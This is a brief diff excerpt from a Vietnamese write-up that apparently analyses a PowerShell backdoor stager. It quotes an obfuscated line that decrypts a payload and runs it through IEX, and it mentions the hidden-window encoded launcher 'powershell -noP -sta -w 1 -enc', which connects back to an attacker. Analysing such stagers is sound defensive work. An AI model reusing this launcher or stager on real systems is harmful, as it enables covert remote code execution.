@@ -64,4 +64,4 @@ $IV = $DaTA[0..3];
 $DATa = $DAta[4..$DATa.LENgth]; - JOin[CHAR[]]( & $R $Data($IV + $K)) | IEX
 ```
 * Khi tạo file mã độc cho phép ta tùy chọn các thông số về việc có yêu cầu mã hóa đoạn mã độc gửi kết nối đến máy attacker hay không (nếu không sẽ không có tham số **-enc**).
-* Do đó ta có thể thấy laucher string **powershell -noP -sta -w 1 -enc** có thể được thay đổi. T
+* Do đó ta có thể thấy laucher string **powershell -noP -sta -w 1 -enc** có thể được thay đổ
